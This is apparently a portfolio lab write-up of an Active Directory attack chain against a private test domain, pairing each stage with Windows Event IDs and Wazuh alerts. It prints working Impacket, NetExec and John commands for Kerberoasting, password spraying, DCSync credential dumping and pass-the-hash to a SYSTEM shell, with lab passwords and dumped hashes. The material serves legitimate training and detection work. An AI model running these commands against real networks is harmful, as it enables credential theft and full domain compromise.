# Active Directory Attack Lab: Kerberoasting, Password Spraying, Credential Dumping, and Pass-the-Hash

## Overview

This project builds a realistic Active Directory environment and executes a complete post-exploitation attack chain against it — from initial enumeration through to full domain compromise — while simultaneously monitoring every stage with Wazuh. Each attack technique is directly relevant to SANS SEC504 (Hacker Tools, Techniques, and Incident Handling) and represents real-world attacker tradecraft observed in enterprise breaches.

The dual offensive/defensive perspective is the core value of this project: every attack is paired with the specific Windows Event IDs and Wazuh alerts it generates, building the ability to recognise these techniques from both sides — as an attacker executing them and as a defender investigating the evidence they leave behind.

## Environment

```
┌─────────────────────────────────┐
│  Kali Linux (192.168.137.60)    │
│  Attack machine                  │
│  Impacket, NetExec, John        │
└──────────────┬──────────────────┘
               │ Operator-Core-Switch (192.168.137.0/24)
┌──────────────┴──────────────────┐
│  DC01 - Windows Server 2019     │
│  Domain: lab.local               │
│  IP: 192.168.137.50             │
│  Wazuh agent + audit logging    │
└──────────────┬──────────────────┘
               │
┌──────────────┴──────────────────┐
│  Windows 11 (192.168.137.1)     │
│  Domain-joined workstation      │
│  CJPC.lab.local                 │
└─────────────────────────────────┘
               │
┌──────────────┴──────────────────┐
│  Wazuh (192.168.137.10)         │
│  Monitoring DC01 Windows        │
│  Event Logs                     │
└─────────────────────────────────┘
```

**Domain accounts created:**

| Account | Type | Password | Purpose |
|---|---|---|---|
| Administrator | Domain Admin | (complex) | DC management |
| jsmith | Standard user | Password123! | Unprivileged attack source |
| sadmin | Domain Admin | Welcome2024! | Password spray target |
| svc_sql | Service account | Summer2024! | Kerberoasting target |

**SPN registered:** `MSSQLSvc/dc01.lab.local:1433` on `svc_sql` — makes the account Kerberoastable by any domain user.

## Audit Logging Configuration

Before executing any attacks, Windows audit policy was configured on the DC to capture the specific Event IDs each technique generates:

```cmd
auditpol /set /subcategory:"Kerberos Service Ticket Operations" /success:enable /failure:enable
auditpol /set /subcategory:"Kerberos Authentication Service" /success:enable /failure:enable
auditpol /set /subcategory:"Logon" /success:enable /failure:enable
auditpol /set /subcategory:"Credential Validation" /success:enable /failure:enable
auditpol /set /subcategory:"Process Creation" /success:enable
auditpol /set /subcategory:"Sensitive Privilege Use" /success:enable /failure:enable
```

PowerShell script block logging enabled via registry — captures every PowerShell command executed on the DC (Event ID 4104):
```cmd
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" /v EnableScriptBlockLogging /t REG_DWORD /d 1 /f
```

---

## Attack 1: Kerberoasting

### What It Is
Kerberoasting exploits the Kerberos authentication protocol's ticket-granting mechanism. Any authenticated domain user can request a Kerberos service ticket (TGS) for any account that has a Service Principal Name (SPN) registered. The ticket is encrypted with the service account's NTLM password hash. That encrypted ticket can be taken offline and cracked without touching the DC again — no lockout, no further network activity, no noise.

### Why It's Dangerous
- Requires only a standard domain user account (no special privileges)
- Offline cracking generates zero domain traffic after the initial ticket request
- Service accounts often have weak passwords and rarely have passwords rotated
- Any domain user can enumerate all Kerberoastable accounts

### Execution

**Step 1 — Request the TGS ticket for all SPN-registered accounts:**
```bash
impacket-GetUserSPNs lab.local/jsmith:Password123! -dc-ip 192.168.137.50 -request -outputfile kerberoast.txt
```

**Output:**
```
ServicePrincipalName          Name     PasswordLastSet
----------------------------  -------  --------------------------
MSSQLSvc/dc01.lab.local:1433  svc_sql  2026-08-14 04:43:39

$krb5tgs$23$*svc_sql$LAB.LOCAL$lab.local/svc_sql*$61c19e0f...
```

**Step 2 — Crack the hash offline:**
```bash
john kerberoast.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs
```

**Result:** `svc_sql : Summer2024!` — plaintext password recovered.

### Defensive Evidence

**Windows Event ID 4769** — "A Kerberos service ticket was requested"

Key fields that identify Kerberoasting:
- `Account Name: jsmith@LAB.LOCAL` — standard user, not an admin
- `Service Name: svc_sql` — service account being targeted
- `Client Address: ::ffff:192.168.137.60` — Kali's IP
- **`Ticket Encryption Type: 0x17`** — RC4 encryption, not AES

The encryption type is the critical indicator. Modern AD environments default to AES encryption (`0x12`/`0x11`). A request for RC4 (`0x17`) on a service account ticket is a strong indicator of Kerberoasting — legitimate clients on modern Windows use AES, Kerberoasting tools specifically request RC4 because it's faster to crack offline.

**Wazuh:** Rule 92652 fired for the Kerberos ticket request event.

*[Screenshot: Windows Event ID 4769 showing jsmith requesting svc_sql ticket with encryption type 0x17]*
*[Screenshot: Kerberoast hash output and John cracking result]*

---

## Attack 2: Password Spraying

### What It Is
Password spraying tries a single common password against many accounts, rather than many passwords against one account. This deliberately stays below account lockout thresholds — if the lockout policy locks accounts after 5 failures, spraying one password across 1,000 accounts generates one failure per account, triggering zero lockouts while potentially compromising many accounts.

### Why It's Dangerous
- Bypasses account lockout policies entirely
- One successful hit on a Domain Admin account = complete domain compromise
- Common corporate passwords (`Welcome2024!`, `Company2024!`, `Season+Year`) succeed more often than expected
- Difficult to distinguish from normal failed logon noise without baseline analysis

### Execution

```bash
nxc smb 192.168.137.50 -u jsmith sadmin svc_sql -p 'Welcome2024!' --continue-on-success
```

**Output:**
```
SMB  192.168.137.50  445  DC01  [-] lab.local\jsmith:Welcome2024! STATUS_LOGON_FAILURE
SMB  192.168.137.50  445  DC01  [+] lab.local\sadmin:Welcome2024! (Pwn3d!)
SMB  192.168.137.50  445  DC01  [-] lab.local\svc_sql:Welcome2024! STATUS_LOGON_FAILURE
```

`(Pwn3d!)` — NetExec confirms administrative access to the DC with `sadmin`'s credentials. A Domain Admin account was compromised with a single password attempt.

### Defensive Evidence

**Windows Event IDs:**
- **4625** — "An account failed to log on" — fired for jsmith and svc_sql failures
- **4624** — "An account was successfully logged on" — fired for sadmin success
- **4771** — Kerberos pre-authentication failures (if Kerberos auth attempted)

**Wazuh alerts fired:**
- Rule 60122 — "Logon failure - Unknown user or bad password" (T1078, T1531)
- Rule 92652 — "Successful Remote Logon Detected - NTLM authentication, possible pass-the-hash attack" (T1550.002, T1078.002)

The sadmin successful logon was automatically flagged as a possible Pass-the-Hash attack by Wazuh — an interesting false-positive-in-reverse: it's actually a password spray success, but Wazuh correctly identified the NTLM network logon pattern as suspicious regardless of the actual technique used.

*[Screenshot: NetExec output showing (Pwn3d!) on sadmin]*
*[Screenshot: Wazuh alerts showing 60122 failures and 92652 suspicious logon]*

---

## Attack 3: Credential Dumping (DCSync / secretsdump)

### What It Is
With Domain Admin credentials (obtained via password spray), `secretsdump` uses the DRSUAPI replication protocol to request all credential material from the DC — the same mechanism used for legitimate DC-to-DC replication. This dumps every account's NTLM hash, Kerberos keys, and cached credentials from the domain.

### Why It's Dangerous
- Extracts every credential in the domain in seconds
- Uses legitimate AD replication — difficult to distinguish from normal DC replication traffic
- The `krbtgt` hash enables Golden Ticket attacks (persistent, near-undetectable domain access)
- No malware or tools need to run on the DC itself

### Execution

```bash
impacket-secretsdump 'lab.local/sadmin:Welcome2024!@192.168.137.50'
```

**Key output (formatted):**
```
Administrator  500  [lmhash]  fbf12d80563e496af62ad2c748963cd2
krbtgt         502  [lmhash]  88933a6959dc13a2f648c974713839bd
jsmith        1103  [lmhash]  2b576acbe6bcfda7294d6bd18041b8fe
sadmin        1104  [lmhash]  7099909e93b8345e3def4331473b8235
svc_sql       1105  [lmhash]  72f0eefcc213ea8f350773b831cf2c9c
```

Every domain account's NTLM hash, usable for offline cracking or direct Pass-the-Hash authentication.

**The krbtgt hash significance:** With the krbtgt account's hash, an attacker can forge Kerberos tickets (Golden Ticket attack) granting persistent Domain Admin access that survives password resets and persists even if the attacker's original access is revoked.

*[Screenshot: secretsdump output formatted with column showing all domain hashes]*

---

## Attack 4: Pass-the-Hash

### What It Is
Windows NTLM authentication accepts the password hash directly — it never needs to be "cracked" to the plaintext. An attacker with a captured NTLM hash can authenticate as that user to any service accepting NTLM authentication, without ever knowing the actual password.

### Why It's Dangerous
- Bypasses the need to crack passwords entirely
- Works even if the password is 30 characters and completely unguessable
- The hash IS the credential for NTLM authentication
- Enables lateral movement across every system where that account has access

### Execution

Using the Administrator NT hash captured from secretsdump:
```bash
impacket-psexec -hashes 'aad3b435b51404eeaad3b435b51404ee:fbf12d80563e496af62ad2c748963cd2' Administrator@192.168.137.50
```

**Output:**
```
[*] Found writable share ADMIN$
[*] Uploading file xFpUkDmp.exe
[*] Creating service Ppxk on 192.168.137.50
[*] Starting service Ppxk

C:\Windows\system32> whoami
nt authority\system
```

**SYSTEM shell on the Domain Controller using only the hash** — no password required, no cracking needed.

### Defensive Evidence

**Windows Event ID 4624** — "An account was successfully logged on"
- `Logon Type: 3` (network logon)
- `Authentication Package: NTLM`
- `Workstation Name: KALI`
- Source IP: `192.168.137.60`

The combination of NTLM network logon (Type 3) from an unexpected source is the Pass-the-Hash fingerprint. Legitimate Administrator logons from the console would show Logon Type 2 (interactive), not Type 3 from a Linux machine.

**Wazuh:** Rule 92652 fired — "Successful Remote Logon Detected - NTLM authentication, possible pass-the-hash attack" (T1550.002, T1078.002)

*[Screenshot: psexec shell showing whoami = nt authority\system]*
*[Screenshot: Wazuh rule 92652 alert for Administrator NTLM logon from Kali]*

---

## The Complete Attack Chain — Timeline

```
[T+0:00] Kerberoasting
         jsmith requests TGS for svc_sql → RC4 hash captured
         → Offline crack → Summer2024!

[T+0:05] Password Spraying
         Welcome2024! sprayed across jsmith, sadmin, svc_sql
         → sadmin (Domain Admin) compromised → (Pwn3d!)

[T+0:07] Credential Dumping
         sadmin used to DCSync → all domain hashes extracted
         → Administrator hash: fbf12d80563e496af62ad2c748963cd2
         → krbtgt hash captured (Golden Ticket potential)

[T+0:10] Pass-the-Hash
         Administrator hash used directly → SYSTEM on DC01
         → Total domain compromise
```

**Total time from first attack to SYSTEM: approximately 10 minutes.**
**Privileges required at start: one standard domain user account (jsmith).**

---

## Key Detection Event IDs — Reference

| Event ID | Description | Attack Technique |
|---|---|---|
| 4769 | Kerberos service ticket requested | Kerberoasting (look for encryption type 0x17) |
| 4768 | Kerberos authentication ticket requested | AS-REP Roasting |
| 4625 | Account failed to log on | Password spraying (volume of failures) |
| 4624 | Account successfully logged on | Pass-the-Hash (Type 3 + NTLM from unexpected source) |
| 4776 | DC attempted to validate credentials | Credential validation attempts |
| 4728/4732 | Member added to security-enabled group | Privilege escalation |
| 4104 | PowerShell script block executed | PowerShell-based attacks (Mimikatz etc.) |
| 4662 | Operation performed on AD object | DCSync (requires DS-Replication rights) |

---

## Infrastructure Notes

**Windows Server Core vs Desktop Experience:** Server Core was chosen deliberately — lighter resource footprint, more realistic (production DCs rarely run a GUI), and forces genuine CLI proficiency rather than relying on graphical tools.

**Audit policy must be explicitly enabled:** Windows Server does not log most security-relevant events by default. The `auditpol` commands at the start of this project are a prerequisite — without them, Kerberoasting and Pass-the-Hash leave no usable evidence in the Windows Security log.

**The `aad3b435b51404eeaad3b435b51404ee` LM hash:** This appears in every account's dump and looks alarming but is actually the empty/null LM hash — it just means LM hashing is disabled (correct, modern behaviour). The NT hash (the second value after the colon) is the one that matters.

## Skills Demonstrated

- Active Directory deployment (Server Core, domain promotion, DNS configuration)
- Domain user/group/SPN management via PowerShell
- Kerberoasting: SPN enumeration, TGS ticket extraction, offline hash cracking
- Password spraying with lockout-safe tooling (NetExec)
- Domain credential dumping via DRSUAPI replication (secretsdump)
- Pass-the-Hash lateral movement (psexec with hash authentication)
- Windows audit policy configuration for AD attack detection
- Windows Security Event Log analysis (Event IDs 4624, 4625, 4769)
- Wazuh monitoring of Windows domain controllers
- Understanding of NTLM authentication internals (why PtH works)
- MITRE ATT&CK mapping: T1558.003 (Kerberoasting), T1110.003 (Password Spraying), T1003.002 (Credential Dumping), T1550.002 (Pass-the-Hash)

## Limitations and Follow-Up Work

- BloodHound/SharpHound AD enumeration not yet performed — graphical attack path analysis showing shortest route to Domain Admin
- No detection tuning performed — in production, 4769 events fire constantly for legitimate service ticket requests; a production detection would require baselining normal RC4 usage before alerting on all instances
- Golden Ticket attack not demonstrated — requires the krbtgt hash (captured) and additional tooling (Mimikatz) — natural next step
- No lateral movement from DC to domain workstation demonstrated — the compromise stopped at the DC rather than pivoting to CJPC (the domain-joined Windows 11 host)
- Mimikatz credential harvesting from memory not performed — would complement secretsdump by showing host-based credential theft rather than network-based
